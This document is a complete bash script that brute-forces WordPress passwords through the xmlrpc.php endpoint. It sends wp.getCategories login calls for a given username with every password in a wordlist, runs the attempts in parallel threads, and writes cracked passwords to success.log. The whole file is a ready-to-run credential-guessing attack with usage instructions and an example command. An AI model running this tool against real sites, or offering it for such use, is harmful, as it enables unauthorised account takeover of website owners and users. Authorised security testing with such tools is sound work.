#!/bin/bash

if [[ $# -ne 4 ]]; then
    echo -e "\nUsage: $0 <endpoint> <username> <wordlist> <threads>\n"
    echo -e "Recommended threads: Less than 15 or you'll face false positives"
    echo -e "Cracked Passwords Location: success.log"
    echo -e "Attempted Passwords Location: attempts.log\n"
    echo "Example:"
    echo -e "  ./xmlrpc.sh http://example.com/xmlrpc.php admin passwords.txt 10\n"
    exit 0
fi

xmlrpc_login() {
    local endpoint="$1"
    local username="$2"
    local password="$3"
    local xml_data="<methodCall><methodName>wp.getCategories</methodName><params><param><value>${username}</value></param><param><value>${password}</value></param></params></methodCall>"

    # Making the request with curl
    curl_response=$(curl --data "${xml_data}" "${endpoint}" -k 2>/dev/null)

    # Checking the response for authentication failure
    if [[ $curl_response == *"Incorrect"* ]]; then
        echo "Trying Password: ${password}"
        echo "[ATTEMPTED] ${password}" >> attempts.log
    else
        echo -e "\nPassword found: ${password}"
        echo "${password}" >> success.log  # Logging to a file with restricted permissions
        echo -e "\n${curl_response}" >> success.log
        exit 0
    fi
}

# Exporting the xmlrpc_login function
export -f xmlrpc_login

xmlrpc_bruteforce() {
    local endpoint="$1"
    local username="$2"
    local wordlist="$3"
    local max_threads="$4"

    # Use parallel to iterate through wordlist and login with maximum of 20 threads
    parallel --max-args=1 --jobs $max_threads xmlrpc_login "$endpoint" "$username" {} :::: "$wordlist"
}

# Usage: ./xmlrpc.sh <endpoint> <username> <wordlist> <threads>
xmlrpc_bruteforce "$1" "$2" "$3" "$4"
